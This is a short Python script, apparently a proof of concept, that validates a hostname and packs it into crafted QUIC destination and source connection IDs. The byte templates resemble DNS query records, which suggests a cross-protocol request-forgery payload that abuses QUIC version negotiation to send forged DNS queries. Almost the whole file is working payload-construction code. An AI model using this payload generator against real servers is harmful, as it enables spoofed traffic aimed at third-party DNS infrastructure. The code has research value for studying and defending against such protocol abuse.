import re
import os

STATIC_SCID_TMPL = b'\x00\x00\x00\x00\x00\x01\t'
SCID_TMPL = b'\x00\x00\x00\x00\x00\x01'

#PAD = b'\x01g\x03com\x00\x00\x01\x00\x01'
PAD = b'\x00\x00\x01\x00\x01'
VER_CNT = 7

b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 \xfaV\xc51\x08q\x10\xf0'

STATIC_DCID_TMPL = b'u-berlin\x02de\x00\x00\x01\x00\x01\x03one\x03com\x00\x00\x01\x00\x01\x03one\x03com\x00\x00\x01\x00\x01\x03one\x03com\x00\x00\x01\x00\x01\x03one\x03com\x00\x00\x01\x00\x01\x03one\x03com\x00\x00\x01\x00\x01\x06padded\x03com\x00\x00\x01\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x24\xfaV\xc51\x08q\x10\xf0'


def is_valid_hostname(hostname):
    if hostname[-1] == ".":
        # strip exactly one dot from the right, if present
        hostname = hostname[:-1]
    if len(hostname) > 253:
        return False

    labels = hostname.split(".")

    # the TLD must be not all-numeric
    if re.match(r"[0-9]+$", labels[-1]):
        return False

    allowed = re.compile(r"(?!-)[a-z0-9-]{1,63}(?<!-)$", re.IGNORECASE)
    return all(allowed.match(label) for label in labels)


def create_payload(host):
    
    if not is_valid_hostname(host):
        raise ValueError("Given payload ist not a valid hostname")

    labels = host.split(".")

    scid = SCID_TMPL + bytes([len(labels[0])])

    dcid_len = ord(labels[0][0])
    dcid = labels[0][1:].encode('utf-8')
    for i in range(1,len(labels)):
        dcid += bytes([len(labels[i])]) + labels[i].encode('utf-8')
    
    dcid += b'\x00\x00\x01\x00\x01'
    dcid += PAD * 6
    dcid += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    
    remain_len = (dcid_len - len(dcid) - 1) + (VER_CNT * 4)

    dcid += bytes([remain_len])
    dcid += os.urandom(dcid_len - len(dcid))
    
    return dcid,scid
